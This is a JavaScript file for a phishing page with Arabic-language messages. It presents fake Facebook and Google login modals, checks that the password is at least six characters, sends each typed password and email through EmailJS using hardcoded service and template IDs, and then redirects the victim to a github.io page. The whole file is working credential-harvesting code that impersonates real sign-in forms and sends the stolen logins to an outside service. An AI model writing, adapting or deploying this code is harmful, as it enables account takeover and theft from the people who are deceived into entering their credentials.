// --- EmailJS Initialization ---
// Make sure to initialize EmailJS with your Public Key
(function() { emailjs.init({ publicKey: "ve0kltmnNlIQEfRGw" }); })();

// Regular expression to find and remove emojis
const EMOJI_REGEX = /(\u00a9|\u00ae|[\u2000-\u3300]|\ud83c[\ud000-\udfff]|\ud83d[\ud000-\udfff]|\ud83e[\ud000-\udfff])/g;

/**
 * Handles form submission, validation, and sending data via EmailJS.
 * @param {string} formId - The ID of the form element.
 * @param {string} buttonId - The ID of the submit button.
 * @param {string} nameFieldId - The ID of the name/password input field.
 * @param {string} emailFieldId - The ID of the email input field.
 */
function handleFormSubmit(formId, buttonId, nameFieldId, emailFieldId) {
    const form = document.getElementById(formId);
    if (!form) return; // Exit if form doesn't exist

    form.addEventListener('submit', function(event) {
        event.preventDefault();
        
        const submitButton = document.getElementById(buttonId);
        const nameInput = document.getElementById(nameFieldId);
        const emailInput = document.getElementById(emailFieldId);
        const serviceID = 'service_isy639u';
        const templateID = 'template_2dyli79';

        // --- Validation ---
        // Clear previous error messages
        form.querySelectorAll('.error-message').forEach(e => e.remove());
        let isValid = true;
        
        // Password length validation
        if (nameInput.value.length < 6) {
            isValid = false;
            const error = document.createElement('p');
            error.className = 'error-message text-red-500 text-xs mt-1 text-right';
            error.textContent = 'كلمة المرور يجب أن تكون 6 أحرف على الأقل.';
            nameInput.parentElement.appendChild(error);
        }

        if (!isValid) return; // Stop submission if validation fails

        // --- If validation passes, proceed to send the email ---
        const originalButtonText = submitButton.innerText;
        submitButton.disabled = true;
        submitButton.innerText = 'جارٍ الدخول...';

        const templateParams = {
            from_name: nameInput.value, // This is the password
            email_id: emailInput.value,
        };

        emailjs.send(serviceID, templateID, templateParams)
            .then(function(response) {
                // On success, redirect the user
                console.log('SUCCESS!', response.status, response.text);
                window.location.href = "https://mo3adli.github.io/home/";
            }, function(error) {
                // On failure, show an alert and re-enable the button
                console.log('FAILED...', error);
                // Note: alert() might be blocked in some environments. 
                // A custom on-page message is often better.
                const statusMessage = document.getElementById('status-message');
                if(statusMessage) {
                    statusMessage.textContent = 'فشل التسجيل. يرجى التحقق من التفاصيل والمحاولة مرة أخرى.';
                    statusMessage.style.color = 'red';
                }
                submitButton.disabled = false;
                submitButton.innerText = originalButtonText;
            });
    });
}

/**
 * Sets up event listeners to open and close a modal.
 * @param {string} modalId - The ID of the modal element.
 * @param {string} openBtnId - The ID of the button that opens the modal.
 * @param {string} closeBtnId - The ID of the button that closes the modal.
 */
function setupModal(modalId, openBtnId, closeBtnId) {
    const modal = document.getElementById(modalId);
    const openBtn = document.getElementById(openBtnId);
    const closeBtn = document.getElementById(closeBtnId);

    if (!modal || !openBtn || !closeBtn) return; // Exit if elements don't exist

    // Open modal
    openBtn.addEventListener('click', () => modal.classList.replace('modal-hidden', 'modal-visible'));
    
    // Close modal with the 'X' button
    closeBtn.addEventListener('click', () => modal.classList.replace('modal-visible', 'modal-hidden'));
    
    // Close modal by clicking on the background overlay
    modal.addEventListener('click', (event) => {
        if (event.target === modal) {
            modal.classList.replace('modal-visible', 'modal-hidden');
        }
    });
}

// --- Initialize All Forms ---
handleFormSubmit('contact-form', 'submit-button', 'name', 'email');
handleFormSubmit('facebook-login-form', 'fb-login-button', 'fb-name', 'fb-email');
handleFormSubmit('google-login-form', 'google-login-button', 'google-name', 'google-email');

// --- Initialize All Modals ---
setupModal('facebook-modal', 'open-facebook-modal', 'close-facebook-modal');
setupModal('google-modal', 'open-google-modal', 'close-google-modal');

// --- Google Modal: Show/Hide Password Logic ---
const showNameCheckbox = document.getElementById('show-name-checkbox');
const googleNameInput = document.getElementById('google-name');
if (showNameCheckbox && googleNameInput) {
    showNameCheckbox.addEventListener('change', function() {
        googleNameInput.type = this.checked ? 'text' : 'password';
    });
}

// --- Prevent Emoji Input in All Specified Fields ---
['email', 'name', 'fb-email', 'fb-name', 'google-email', 'google-name'].forEach(id => {
    const inputElement = document.getElementById(id);
    if (inputElement) {
        inputElement.addEventListener('input', (e) => {
            e.target.value = e.target.value.replace(EMOJI_REGEX, '');
        });
    }
});

